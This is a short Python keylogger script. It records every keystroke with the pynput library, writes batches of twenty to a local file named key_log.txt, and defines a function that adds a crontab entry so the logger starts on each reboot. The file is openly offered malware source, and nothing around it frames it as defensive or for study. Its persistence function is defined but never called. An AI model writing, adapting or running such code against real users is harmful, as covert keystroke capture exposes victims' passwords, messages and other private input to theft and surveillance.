#Install pynput for monitoring keyboard: pip install pynput
from pynput.keyboard import Key, Listener
from crontab import CronTab

count = 0
keys = []
my_bool = False

# print the key strokes to the log file
def on_press(key):
  global keys, count

  keys.append(key)
  count += 1
  print("{0} pressed".format(key))

  if count >= 20:
    count = 0
    write_file(keys)
    keys = []

def write_file(key):
  with open("key_log.txt", "w") as f:
    for key in keys:
      f.write(str(key))

def on_release(key):
  if key==Key.esc:
    return my_bool 

#create entry in crontab to run keylogger on startup
def cron():
    my_cron = CronTab(user=True)
    job = my_cron.new(command = 'python <FILEPATH>')  #edit filepath to location of keylogger download
    job.every_reboot()
    my_cron.write()

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
    
